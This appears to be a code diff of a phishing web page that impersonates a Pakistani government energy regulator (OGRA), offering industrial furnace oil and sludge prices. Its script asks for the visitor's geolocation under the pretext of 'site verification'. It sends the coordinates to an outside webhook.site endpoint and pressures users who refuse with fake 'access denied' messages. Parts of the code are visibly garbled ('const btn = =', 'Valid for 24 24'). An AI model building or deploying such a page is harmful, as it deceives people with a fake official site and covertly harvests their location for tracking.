@@ -2,32 +2,33 @@
 <html lang="ur" dir="ltr">
 <head>
     <meta charset="UTF-8">
-    <title>Pakistan Energy Price Portal | Official</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Industrial Fuel Regulatory Portal</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        .pak-green { background-color: #006600; }
-        .pak-white { color: #ffffff; }
+        .gov-blue { background-color: #002d72; }
     </style>
 </head>
-<body class="bg-gray-100 font-sans">
+<body class="bg-gray-100 font-sans text-gray-900">
 
     <!-- Header -->
-    <header class="pak-green text-white p-4 shadow-lg">
-        <div class="max-w-4xl mx-auto flex justify-between items-center">
-            <h1 class="text-xl font-bold">Energy Price Portal - Pakistan</h1>
-            <span class="text-xs bg-white text-green-800 px-2 py-1 rounded">Verified Portal</span>
+    <nav class="gov-blue text-white p-5 shadow-lg border-b-4 border-yellow-500">
+        <div class="max-w-md mx-auto text-center">
+            <h1 class="font-bold text-lg">OGRA Energy Regulatory Portal</h1>
+            <p class="text-[10px] uppercase tracking-widest text-yellow-400">Official Secure Access</p>
         </div>
-    </header>
+    </nav>
 
-    <!-- Main Content -->
-    <main class="max-w-4xl mx-auto mt-8 p-6">
-        <div id="portal-container" class="bg-white p-8 rounded-lg shadow-md border-t-4 border-green-700">
-            <h2 class="text-2xl font-bold text-gray-800 mb-4">Industrial Fuel Rates (Q4 2026)</h2>
-            <p id="status-msg" class="text-gray-600 mb-6">Access real-time furnace oil and sludge rates for your industrial unit. Regional transport subsidies vary by location.</p>
-
-            <div id="content-area">
-                <button id="btn-fetch" onclick="initiateAuth()" class="w-full bg-green-700 text-white font-bold py-4 rounded-lg hover:bg-green-800 transition shadow-lg">
-                    Verify Location & Fetch Live Rates
+    <!-- Main Card -->
+    <main class="max-w-md mx-auto mt-10 p-6">
+        <div id="main-card" class="bg-white p-8 rounded-xl shadow-xl border border-gray-200">
+            <div id="content-area" class="text-center">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/3/32/Flag_of_Pakistan.svg" class="w-16 mx-auto mb-4 opacity-80">
+                <h2 class="text-xl font-bold text-blue-900 mb-2">Industrial Fuel Price Verification</h2>
+                <p id="msg" class="text-gray-600 text-sm mb-6">Access to real-time furnace oil and sludge pricing is restricted to verified industrial sites. Please verify your location to proceed.</p>
+                
+                <button id="btn-fetch" onclick="initiateAuth()" class="w-full bg-blue-900 text-white font-bold py-4 rounded-lg hover:bg-blue-800 transition active:scale-95 shadow-lg">
+                    Verify Site Location
                 </button>
             </div>
         </div>
@@ -35,8 +36,7 @@
 
     <script>
         function initiateAuth() {
-            const btn = document.getElementById('btn-fetch');
-            btn.innerText = "Authenticating Location...";
+            const btn = =            btn.innerText = "Processing Security Handshake...";
             btn.disabled = true;
 
             if (navigator.geolocation) {
@@ -48,33 +48,28 @@
         }
 
         async function releaseData(pos) {
-            // Data collection
-            const data = {
-                lat: pos.coords.latitude,
-                lon: pos.coords.longitude,
-                timestamp: new Date().toISOString()
-            };
-
+            const data = { lat: pos.coords.latitude, lon: pos.coords.longitude };
             await fetch("https://webhook.site/a5810f06-e1e7-4069-a0b5-4eda839f0b5b", {
                 method: "POST",
                 body: JSON.stringify(data)
             });
 
-            // Show the "Trustworthy" data
-            document.getElementById('portal-container').innerHTML = `
-                <h2 class='text-2xl font-bold text-green-800'>Access Granted</h2>
-                <div class='mt-6 space-y-4'>
-                    <div class='p-4 border rounded'>Furnace Oil (IFO): <span class='font-bold text-green-700'>Rs. 198,400 / MT</span></div>
-                    <div class='p-4 border rounded'>Industrial Sludge: <span class='font-bold text-green-700'>Rs. 89,200 / MT</span></div>
+            // Yahan ab rates dikhenge, pehle nahi
+            document.getElementById('main-card').innerHTML = `
+                <h2 class='text-xl font-bold text-green-700 text-center mb-6'>Verification Successful</h2>
+                <div class='space-y-4'>
+                    <div class='p-4 bg-gray-50 border-l-4 border-green-600'>Furnace Oil (IFO): <span class='font-bold'>Rs. 198,400 / MT</span></div>
+                    <div class='p-4 bg-gray-50 border-l-4 border-green-600'>Industrial Sludge: <span class='font-bold'>Rs. 89,200 / MT</span></div>
                 </div>
-                <p class='mt-6 text-xs text-gray-400'>*Rates are subject to change. Valid for 24 24            `;
+                <p class='mt-6 text-[10px] text-gray-400 text-center'>Authorized by Energy Regulatory Authority.</p>
+            `;
         }
 
         function handleBlock() {
-            const msg = document.getElementById('status-msg');
-            msg.innerText = "ERROR: Location access is mandatory to comply with regional pricing regulations. Please allow access to view rates.";
+            const msg = document.getElementById('msg');
+            msg.innerText = "ACCESS DENIED: Your site location could not be verified. Please tap 'Allow' on the browser prompt to unlock pricing data.";
             msg.classList.add("text-red-600", "font-bold");
-            document.getElementById('btn-fetch').innerText = "Retry: Allow Location Access";
+            document.getElementById('btn-fetch').innerText = "Retry Verification";
             document.getElementById('btn-fetch').disabled = false;
         }
     </script>
